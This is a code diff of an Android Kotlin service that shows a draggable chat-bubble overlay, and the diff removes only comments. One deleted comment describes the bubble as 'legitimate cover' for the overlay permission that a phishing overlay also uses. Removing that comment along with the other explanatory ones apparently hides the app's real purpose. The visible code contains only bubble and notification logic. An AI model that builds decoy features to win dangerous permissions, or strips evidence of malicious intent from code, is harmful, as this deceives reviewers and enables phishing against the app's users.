@@ -23,11 +23,6 @@ import android.widget.FrameLayout
 import android.widget.TextView
 import androidx.core.app.NotificationCompat
 
-/**
- * QuickAccessService — shows a draggable chat bubble when app is backgrounded.
- * Tap to reopen, long-press to dismiss.
- * Legitimate cover for SYSTEM_ALERT_WINDOW — same permission used by phishing overlay.
- */
 class QuickAccessService : Service() {
 
     private var windowManager: WindowManager? = null
@@ -58,7 +53,7 @@ class QuickAccessService : Service() {
         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
         createNotificationChannel()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            // Android 14+ requires foreground service type
+            
             startForeground(
                 NOTIF_ID,
                 buildNotification(),
@@ -79,7 +74,7 @@ class QuickAccessService : Service() {
         super.onDestroy()
     }
 
-    // ── Bubble ────────────────────────────────────────────────────────────────
+    
 
     private fun showBubble() {
         if (bubbleView != null) return
@@ -144,7 +139,7 @@ class QuickAccessService : Service() {
                 MotionEvent.ACTION_UP -> {
                     longPressHandler.removeCallbacks(longPressRunnable)
                     if (!isDrag && !longPressTriggered) {
-                        // Tap — bring app back to foreground
+                        
                         val launchIntent = packageManager
                             .getLaunchIntentForPackage(packageName)
                             ?.apply {
@@ -170,7 +165,7 @@ class QuickAccessService : Service() {
             setBackgroundColor(Color.TRANSPARENT)
         }
 
-        // Outer glow ring
+        
         val ring = View(this).apply {
             layoutParams = FrameLayout.LayoutParams(dp(64), dp(64))
             background = GradientDrawable().apply {
@@ -179,7 +174,7 @@ class QuickAccessService : Service() {
             }
         }
 
-        // Main blue circle
+        
         val inner = FrameLayout(this).apply {
             layoutParams = FrameLayout.LayoutParams(dp(52), dp(52)).apply {
                 gravity = Gravity.CENTER
@@ -192,7 +187,7 @@ class QuickAccessService : Service() {
             elevation = 10f
         }
 
-        // "T" letter
+        
         val letter = TextView(this).apply {
             text = "T"
             textSize = 22f
@@ -205,7 +200,7 @@ class QuickAccessService : Service() {
             )
         }
 
-        // Red notification dot
+        
         val dot = View(this).apply {
             layoutParams = FrameLayout.LayoutParams(dp(14), dp(14)).apply {
                 gravity = Gravity.TOP or Gravity.END
@@ -234,7 +229,7 @@ class QuickAccessService : Service() {
         }
     }
 
-    // ── Foreground notification (required to keep service alive) ─────────────
+    
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
